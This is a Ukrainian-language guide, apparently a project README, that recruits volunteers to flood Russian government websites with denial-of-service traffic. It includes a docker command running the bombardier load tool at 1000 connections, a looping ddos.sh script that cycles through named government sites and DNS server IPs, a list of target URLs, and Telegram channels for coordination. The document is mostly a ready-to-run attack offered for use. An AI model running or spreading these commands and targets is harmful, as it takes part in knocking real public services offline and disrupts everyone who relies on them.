# Android/iOS
**Впевніться, що у вас достатньо заряду акумулятора та є доступ до зарядки**  
1. За можилвості встановіть VPN (сервіси дуже швидко блокують ip адреси з України)  
- [F-Secure](https://www.f-secure.com/en/home/login)  
- [список альтернативних сервісів](https://t.me/c/1627443142/3)  
2:   
[Android/iOS]  
Просто відкрийте і залиште сайт відкритим - [https://stop-russian-desinformation.near.page/](https://stop-russian-desinformation.near.page/)  
[Android]  
[Встановіть додаток та слідуйте туторіалу за посиланням](https://telegra.ph/YAk-ddositi-na-telefon%D1%96-02-24)  
Нові адреси для ddos атаки публікуються в [Telegram каналі](https://t.me/+97Y45he5lOI2ZTky)  

# Windows/Mac/Linux
1. Встановіть [Docker](https://www.docker.com/products/docker-desktop)
2. Встановіть VPN 
- [F-Secure](https://www.f-secure.com/en/home/login) - РЕКОМЕНДОВАНО
- [ProtonVPN](https://protonvpn.com/download)
- [Windscribe](https://windscribe.com/download)
- [ClearVPN](https://my.clearvpn.com/enter)
- [Urban VPN](https://www.urban-vpn.com/)
4. Запустіть в терміналі команду
```
docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://www.gosuslugi.ru
```
(замініть `https://www.gosuslugi.ru` на необхідний сайт - нові адреси для ddos атаки публікуються в [Telegram каналі](https://t.me/+97Y45he5lOI2ZTky))  
**Ви можете відкрити декілька вікон терміналу**  

# Канали для новин та координації
- [https://t.me/+97Y45he5lOI2ZTky](https://t.me/+97Y45he5lOI2ZTky)
- [https://t.me/ddosRussians](https://t.me/ddosRussians)
- [https://t.me/itguildukraine](https://t.me/itguildukraine)

# Доповнення  
Можете створити файл `ddos.sh` з контентом:
```
#!/bin/bash -x
DESTS=( "http://duma.gov.ru/" "http://president-sovet.ru/" "https://sovetnational.ru/" "https://www.gosuslugi.ru/ru/" "https://zakupki.gov.ru/epz/main/public/home.html" "https://gossluzhba.gov.ru/" "http://defence.council.gov.ru/" "http://budget.council.gov.ru/" "http://www.kremlin.ru/" "https://government.ru/" "http://www.scrf.gov.ru/" "http://www.ksrf.ru/ru/Pages/default.aspx" "http://www.vsrf.ru/" "http://premier.gov.ru/events/" "https://www.mchs.gov.ru/" "https://minjust.gov.ru/ru/" "http://www.fsb.ru/" "https://rosguard.gov.ru/" "https://customs.gov.ru/" "https://udprf.ru/" "http://favt.gov.ru/" "http://194.67.2.109:53/UDP" "http://194.67.7.1:53/UDP" "http://194.54.14.187:53/UDP" "http://194.54.14.186:53/UDP" )
TIME="180s"
while TRUE
do
   for DEST in ${DESTS[@]}
   do
       docker run -ti --rm alpine/bombardier -c 1000 -d $TIME -l $DEST
   done
done
```
та запустити з допомогою команди `chmod +x ddos.sh && sh ddos.sh` в терміналі  

# Корисні ресурси
- [Туторіал по DDoS](https://tarahtino.notion.site/tarahtino/DDoS-1505b74f6f8443768dc47e0f4d2ee8b2)

## Ресурси для атаки (краще слідкувати за апдейтами в Telegram)
`http://duma.gov.ru/` `http://president-sovet.ru/` `https://sovetnational.ru/` `https://www.gosuslugi.ru/ru/` `https://zakupki.gov.ru/epz/main/public/home.html` `https://gossluzhba.gov.ru/` `http://defence.council.gov.ru/` `http://budget.council.gov.ru/` `http://www.kremlin.ru/` `https://government.ru/` `http://www.scrf.gov.ru/` `http://www.ksrf.ru/ru/Pages/default.aspx` `http://www.vsrf.ru/` `http://premier.gov.ru/events/` `https://www.mchs.gov.ru/` `https://minjust.gov.ru/ru/` `http://www.fsb.ru/` `https://rosguard.gov.ru/` `https://customs.gov.ru/` `https://udprf.ru/` `http://favt.gov.ru/`

[Contribute](https://github.com/domanskyi/xsquad)
